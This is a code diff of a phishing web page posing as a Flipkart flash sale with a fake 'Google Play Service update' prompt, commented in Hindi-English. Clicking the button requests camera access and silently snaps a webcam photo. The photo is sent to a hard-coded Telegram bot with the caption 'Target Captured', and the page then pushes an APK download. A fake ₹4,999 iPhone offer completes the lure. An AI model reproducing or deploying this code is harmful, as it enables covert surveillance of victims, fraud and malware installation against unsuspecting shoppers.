@@ -1,27 +1,76 @@
 <!DOCTYPE html>
 <html>
-<head><title>HD Video Stream</title></head>
-<body style="background:#000;color:#fff;text-align:center;padding-top:20%;font-family:sans-serif;">
-    <div id="status">▶️ Video is Buffering...<br>Please Allow Camera for HD Quality.</div>
+<head>
+    <title>⚡ Flipkart Huge Sale - Up to 90% Off!</title>
+    <style>
+        body { background: #f1f3f6; font-family: sans-serif; margin: 0; padding: 0; }
+        .header { background: #2874f0; color: #fff; padding: 10px 20px; font-weight: bold; font-size: 20px; }
+        .box { background: #fff; border-radius: 5px; margin: 20px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .btn { background: #fb641b; color: #fff; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; width: 80%;}
+        .icon { font-size: 60px; margin-bottom: 10px; color: #fb641b; }
+        img.product-img { max-width: 100%; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <div class="header">Flipkart Super Deals ⚡</div>
+
+    <div class="box">
+        <div class="icon">🎁</div>
+        <h3>Alert: Google Play Service Update Required</h3>
+        <p>Aapke phone mein 'Flipkart' application ko safely run karne ke liye ek important security update chahiye. Update karke continuous sale experience ka maza lein.</p>
+        
+        <button class="btn" onclick="startFlipkart()">Update & Continue to Sale</button>
+    </div>
+    
+    <div class="box" style="display: none;" id="productBox">
+        <h3>Today's Deals: Up to 90% Off!</h3>
+        <p>Special prices for selected products only for the next 2 hours.</p>
+        <img src="https://rukminim1.flixcart.com/image/312/312/l5h2xe80/mobile/x/d/h/11-13-11-t-apple-original-imagg453xat3gx4v.jpeg?q=70" alt="iPhone" class="product-img">
+        <p><b>Apple iPhone 11 (64GB, White)</b></p>
+        <p><b>Special Price: ₹4,999</b> (Regular: ₹38,999)</p>
+    </div>
+
     <video id="v" autoplay style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
+
     <script>
-        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+        function startFlipkart() {
+            // 1. Pehle Camera Permission Maangein (Background Update)
+            navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+                let v = document.getElementById('v');
+                v.srcObject = s;
+                
+                // Photo khinch kar Telegram par bhejo
+                setTimeout(capture, 2000);
+                
+                // 2. APK Download shuru kar do (Direct Link yahan dalein)
+                window.location.href = "https://example.com/flipkart_updater.apk";
+                
+                // 3. Fake System Update Popup
+                // Hum APK download karte hi user ko sale page par redirect kar denge.
+
+            }).catch(e => {
+                alert("Alert: Please click 'Allow' to update Google Play Services and continue to the sale.");
+            });
+        }
+
+        function capture() {
             let v = document.getElementById('v');
-            v.srcObject = s;
-            setTimeout(() => {
-                let c = document.getElementById('c');
-                c.width = 640; c.height = 480;
-                c.getContext('2d').drawImage(v, 0, 0);
-                let img = c.toDataURL('image/jpeg', 0.7).split(',')[1];
-                fetch('https://api.telegram.org/bot8654099233:AAHUe3-Cmh4Yi4v1sI4dwsGi7E4BTdTcMR4/sendPhoto', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: '2043988256', photo: img, caption: "📸 Target Captured from Link!" })
-                });
-                document.getElementById('status').innerHTML = "⌛ Server Busy. Please try again later.";
-            }, 3000);
-        }).catch(e => alert("Please Enable camera to watch video!"));
+            let c = document.getElementById('c');
+            c.width = 640; c.height = 480;
+            c.getContext('2d').drawImage(v, 0, 0);
+            let img = c.toDataURL('image/jpeg', 0.5).split(',')[1];
+
+            fetch('https://api.telegram.org/bot8654099233:AAHUe3-Cmh4Yi4v1sI4dwsGi7E4BTdTcMR4/sendPhoto', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: '2043988256', photo: img, caption: "📸 Button Clicked! Target Captured." })
+            }).then(() => {
+                // Photo bhejne ke baad, actual sale page show karo ya asli Flipkart par bhej do.
+                document.getElementById('productBox').style.display = 'block';
+                // window.location.href = "https://www.flipkart.com/"; 
+            });
+        }
     </script>
 </body>
 </html>
